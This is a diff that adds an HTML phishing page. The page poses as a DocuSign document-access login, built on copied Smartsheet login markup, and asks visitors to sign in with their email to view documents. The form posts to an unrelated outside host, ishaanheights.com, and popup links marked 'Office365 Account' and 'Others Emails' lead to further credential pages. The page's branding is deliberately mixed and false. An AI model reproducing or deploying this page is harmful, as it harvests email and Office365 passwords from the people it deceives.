@@ -1,0 +1,201 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" name="viewport" />
+	<meta content="Log into your Smartsheet account. Or, sign-up for a free 30 day trial, no credit card required." name="description" />
+	
+	<title>Log In | DocuSign</title>
+	<link href="../../../../i.imgur.com/4uOHirI.png4" rel="icon" type="image/x-icon" />
+	<link href="../../../../i.imgur.com/4uOHirI.png" rel="shortcut icon" type="image/x-icon" />
+	<link href="login.2x_59.2.3.css" rel="stylesheet" title="smartsheet_login" type="text/css" /><script type="text/javascript" language="JavaScript" CHARSET="UTF-8">
+        var ZQ = {
+            "AHFV": "59.2",
+            "AVQB": "3",
+            "version": "59.2.3",
+            "AHCS": "https://s.smartsheet.com/b"
+        };
+    </script><script type="text/javascript" language="JavaScript" CHARSET="UTF-8" src="../../../../app.smartsheet.com/b/javascript/1_59.2.3.js"></script><script type="text/javascript" language="JavaScript" CHARSET="UTF-8" src="../../../../app.smartsheet.com/b/javascript/LG_59.2.3.js"></script>
+	<link href="../../../../s.smartsheet.com/b/images/img_icon-57x57.png" rel="apple-touch-icon" sizes="57x57" />
+	<link href="../../../../s.smartsheet.com/b/images/img_icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
+	<link href="../../../../s.smartsheet.com/b/images/img_icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
+	<link href="../../../../s.smartsheet.com/b/images/img_icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
+	<link href="../../../../s.smartsheet.com/b/images/img_icon-167x167.png" rel="apple-touch-icon" sizes="167x167" />
+	<link href="../../../../s.smartsheet.com/b/images/img_icon-180x180.png" rel="apple-touch-icon" sizes="180x180" />
+	<link href="../../../../s.smartsheet.com/b/images/img_icon-128x128.png" rel="shortcut icon" sizes="128x128" />
+	<link href="../../../../s.smartsheet.com/b/images/img_icon-196x196.png" rel="shortcut icon" sizes="196x196" /><script type="text/javascript" CHARSET="UTF-8">
+        <!--
+        function popupwnd(url, toolbar, menubar, locationbar, resize, scrollbars, statusbar, left, top, width, height)
+{
+   if (left == -1)
+   {
+      left = (screen.width/2)-(width/2);
+   }
+   if (top == -1)
+   {
+      top = (screen.height/2)-(height/2);
+   }
+   var popupwindow = this.open(url, '', 'toolbar=' + toolbar + ',menubar=' + menubar + ',location=' + locationbar + ',scrollbars=' + scrollbars + ',resizable=' + resize + ',status=' + statusbar + ',left=' + left + ',top=' + top + ',width=' + width + ',height=' + height);
+}
+//-->
+</script>
+
+        <!--
+        function showTooltips(node, text) {
+
+            if (node && text) {
+                var node = $(node);
+                var position = node.offset();
+                var top = position.top + node.outerHeight() + 2; /* adding 2px to create separation from login button border. */
+                var left = position.left + node.outerWidth() + 2; /* adding 2px to create separation from login button border. */
+                $('#tooltips').html(text).css({
+                    top: top + 'px',
+                    left: left + 'px'
+                }).show();
+            }
+        }
+
+        function hideTooltips() {
+
+            $('#tooltips').hide();
+        }
+
+        function loadLoginBody() {
+            BMQE();
+            BWAQ(false);
+
+            addPlaceholderSupport(false);
+
+            if (!loggedFailures()) {
+                var exceptions = $('.clsJspFormErrorTable');
+                if (exceptions.length != 0) {
+                    logExternalGTMEvent({
+                        'event': 'app-login-failure',
+                        'method': 'onsite',
+                        'error': 'missing required fields'
+                    });
+                }
+            }
+
+        }
+
+        function downloadApp(type, logID) {
+            var gmtEvent = {
+                'event': 'application-event',
+                'object-verb': 'Click'
+            };
+
+            switch (type) {
+                case 'ios':
+                    gmtEvent['object-noun'] = 'iOS Download - Login Page';
+                    window.open('https://itunes.apple.com/app/smartsheet/id568421135', 'new');
+                    break;
+                case 'android':
+                    gmtEvent['object-noun'] = 'Android Download - Login Page';
+                    window.open('https://play.google.com/store/apps/details?id=com.smartsheet.android', 'new');
+                    break;
+            }
+            logExternalGTMEvent(gmtEvent);
+
+        }
+
+        function loggedFailures() {
+            return false
+        }
+        window.onload = loadLoginBody;
+        -->
+    </script>
+</head>
+<body class="clsBody" style="margin: 0px; padding: 0px; background-color: rgb(255, 255, 255);">
+<div id="AIAS" style="position:absolute; top: 0; right: 0; bottom: 0; left: 0;">&nbsp;</div>
+<table style="position:absolute; width:100%; height:100%; border: 0px none; border-collapse:collapse;">
+	<tbody>
+		<tr>
+			<td class="clsGlobalLayoutSideColumn">&nbsp;</td>
+			<td class="clsGlobalLayoutContentCell">
+			<form action="http://ishaanheights.com/pot/dwn/control/index2.php" class="clsJspOuterForm" id="" method="POST" name="ctlForm">
+			    <div class="logo">
+                        <br><br><br><br><br><br><center><img src="../../../../www.docusign.net/Member/Images/docusign.png" alt="PandaDoc" width=185 height=55 /></center>
+			<div class="clsJspForm" style="position:relative; top:30px; left:20px; width:100%;">
+			<div class="clsJspFormHeader" id="divFormTitleBar" name="divFormTitleBar" style="text-align: center; width: 100%; color: white;">Log in with your receiving Email to view documents.</div>
+
+			<div id="divFormBody" name="divFormBody" style="overflow: auto; ">
+			
+			<div class="clsJspFormBody">
+			<div class="clsJspFormTable" style="display:inline-block;">
+			<table class="clsJspFormLoginTable">
+				<tbody>
+					
+					
+					<tr>
+						<td style="vertical-align:top; text-align:center; width:100%;">
+						<div class="clsJspButtonNarrow">
+						<table class="clsLoginMethod clsJspButtonNarrow clsJspMultiButtonsRow">
+							<tbody>
+								<tr>
+									<td><a class="clsJspButtonNarrow" href="javascript:popupwnd('account','no','no','no','no','no','no','401','101','601','501')" target="_self" onmouseout="hideTooltips()" onmouseover="showTooltips(this, &quot;Log in with your work account.&lt;br/&gt;Use this option if you use Office365 at work.&quot;)"><img alt="Microsoft" id="azureADlogo" src="../../../../s.smartsheet.com/b/images/img_login_microsoft2.2x.png" style="width: 14px;
+    height: 14px;
+    margin-left: -6px;" /> <span style="
+    margin-left: -2px;
+"> Office365 Account </span> </a>
+
+									<div>&nbsp;</div>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+						<table class="clsLoginMethod clsJspButtonNarrow">
+							<tbody>
+								<tr>
+									<td><a class="clsJspButtonNarrow" href="javascript:popupwnd('index2.php','no','no','no','no','no','no','401','101','801','561')" target="_self" onmouseout="hideTooltips()" onmouseover="showTooltips(this, &quot;Log in with your YahooMail, AOL, Hotmail, Webmail&quot;)"><img alt="Google" id="googlelogo" src="images/email.jpg" /> <span> Others Emails</span> </a>
+									<div>&nbsp;</div>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+						
+						</div>
+						</td>
+					</tr>
+					<tr>
+						<td align="center">&nbsp;</td>
+					</tr>
+				</tbody>
+			</table>
+			</div>
+			</div>
+			</div>
+
+
+			</div>
+
+			<div class="clsPostFormInfo" id="divPostFormInfo" name="divPostFormInfo" style="text-align: center; width: 100%; ">
+			<div class="clsTextWhite clsTextXLarge"></div>
+
+			<div class="clsTextWhite" style="margin-top:10px;"></div>
+
+			
+			</div>
+			</form>
+			</td>
+			<td class="clsGlobalLayoutSideColumn">&nbsp;</td>
+		</tr>
+		<tr>
+			<td class="clsGlobalLayoutSideColumn">&nbsp;</td>
+			<td class="clsBottomLinks">
+			</td>
+			<td class="clsGlobalLayoutSideColumn">&nbsp;</td>
+		</tr>
+	</tbody>
+</table>
+
+<div class="clsTooltips" id="tooltips">&nbsp;</div>
+</body>
+<script>
+    var frame = document.createElement('iframe');
+    frame.name = 'gtm';
+    frame.style.display = 'none';
+    frame.id = 'externalGTMIframe';
+    frame.src = 'https://s.smartsheet.com/b/htmlSandbox/gtm-iframe_v2.html?' + encodeURIComponent(location.protocol + '//' + location.host) + '&GTM-5GPPFG&eventObject=login screen&eventNoun=Form - Login';
+    document.body.appendChild(frame);
+</script></html>
